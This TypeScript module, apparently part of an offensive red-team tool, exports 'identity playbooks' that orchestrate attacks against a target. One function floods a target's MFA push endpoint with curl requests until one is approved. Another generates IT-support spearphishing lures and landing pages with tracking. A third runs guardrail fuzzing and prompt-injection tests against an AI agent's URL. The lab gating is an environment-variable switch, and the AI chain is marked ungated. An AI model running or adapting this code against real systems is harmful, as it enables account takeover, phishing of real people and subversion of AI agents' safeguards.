/**
 * @module identity_playbooks
 * Executable identity playbooks — MFA fatigue, vishing, AI-agent abuse chains.
 */
import { ToolBroker } from "./tool_broker.ts"
import { runIdentityChain } from "./identity_chain.ts"
import { resolveLiveMode } from "./exec_options.ts"

export interface PlaybookResult {
  playbook: string
  steps: Array<{ action: string; success: boolean; detail: string }>
  findings: string[]
  labGated: boolean
}

export async function runMfaFatigueProbe(
  target: string,
  opts: { live?: boolean; maxAttempts?: number; broker?: ToolBroker } = {},
): Promise<PlaybookResult> {
  const broker = opts.broker ?? new ToolBroker()
  const live = resolveLiveMode(opts)
  const max = opts.maxAttempts ?? 5
  const steps: PlaybookResult["steps"] = []
  const findings: string[] = []

  if (!live) {
    return {
      playbook: "mfa_fatigue",
      steps: [{ action: "blocked", success: false, detail: "live execution required" }],
      findings: [],
      labGated: true,
    }
  }

  if (process.env.OURMINE_TIER1_MFA !== "1" && process.env.OURMINE_TIER1 !== "1" && process.env.OURMINE_AUTONOMOUS !== "1") {
    return {
      playbook: "mfa_fatigue",
      steps: [{ action: "blocked", success: false, detail: "Set OURMINE_TIER1_MFA=1 for authorized lab" }],
      findings: [],
      labGated: true,
    }
  }

  for (let i = 0; i < max; i++) {
    try {
      const cmd = `curl -sS -X POST ${target.startsWith("http") ? target : `https://${target}`}/api/v1/mfa/push -d '{"attempt":${i}}'`
      const exec = await broker.executeSafe(cmd, process.cwd())
      const ok = exec.exitCode === 0
      steps.push({ action: `push_${i + 1}`, success: ok, detail: (exec.stdout + exec.stderr).slice(0, 100) })
      if ((exec.stdout + exec.stderr).toLowerCase().includes("approved")) {
        findings.push("MFA push may have been approved — fatigue vector viable")
        break
      }
    } catch (err) {
      steps.push({ action: `push_${i + 1}`, success: false, detail: String((err as Error).message).slice(0, 80) })
    }
  }

  return { playbook: "mfa_fatigue", steps, findings, labGated: true }
}

export async function runVishingPlaybook(
  targetDomain: string,
  opts: { live?: boolean; outputDir?: string } = {},
): Promise<PlaybookResult> {
  const { runAutomatedCampaign } = await import("./social_eng_auto.ts")
  const live = resolveLiveMode({ live: opts.live ?? false })
  const result = await runAutomatedCampaign({
    targetDomain,
    template: "it_support",
    lureType: "it_support",
    live,
    dryRun: !live,
    outputDir: opts.outputDir,
    targets: opts.live ? [{ name: "Lab Target", email: `target@${targetDomain}`, company: targetDomain }] : undefined,
  })

  return {
    playbook: "vishing_spearphish",
    steps: [
      { action: "generate_lure", success: !!result.emailTemplate, detail: result.status },
      { action: "landing_page", success: !!result.landingPage, detail: result.campaignId },
    ],
    findings: result.trackingEnabled ? ["Spearphish campaign artifacts generated with tracking"] : [],
    labGated: !opts.live,
  }
}

export async function runAiAgentAbuseChain(
  agentUrl: string,
  opts: { live?: boolean; broker?: ToolBroker } = {},
): Promise<PlaybookResult> {
  const { auditAIAgentGuardrails } = await import("./ai_agent_audit.ts")
  const { AiSecurityAnalyzer } = await import("./ai_manipulation.ts")
  const steps: PlaybookResult["steps"] = []
  const findings: string[] = []

  const audit = await auditAIAgentGuardrails({ targetAgentUrl: agentUrl, fuzzDepth: "full" }, { live: opts.live ?? false })
  steps.push({ action: "guardrail_audit", success: true, detail: JSON.stringify(audit).slice(0, 120) })

  const analyzer = new AiSecurityAnalyzer({ targetUrl: agentUrl, dryRun: !opts.live })
  const manip = await analyzer.analyzePromptSecurity({ targetUrl: agentUrl, dryRun: !opts.live })
  steps.push({
    action: "manipulation_suite",
    success: (manip.injectionTests?.length ?? 0) > 0,
    detail: `${manip.injectionTests?.length ?? 0} injection tests`,
  })

  for (const m of manip.injectionTests ?? []) {
    if (m.success) findings.push(`AI injection succeeded: ${m.name}`)
  }

  return { playbook: "ai_agent_abuse", steps, findings, labGated: false }
}

export async function runFullIdentityPlaybook(
  target: string,
  opts: { live?: boolean } = {},
): Promise<{ chain: Awaited<ReturnType<typeof runIdentityChain>>; mfa: PlaybookResult; vishing: PlaybookResult }> {
  const domain = target.replace(/^https?:\/\//, "").split("/")[0] ?? target
  const [chain, mfa, vishing] = await Promise.all([
    runIdentityChain(target, opts),
    runMfaFatigueProbe(target, opts),
    runVishingPlaybook(domain, opts),
  ])
  return { chain, mfa, vishing }
}

export default { runMfaFatigueProbe, runVishingPlaybook, runAiAgentAbuseChain, runFullIdentityPlaybook }
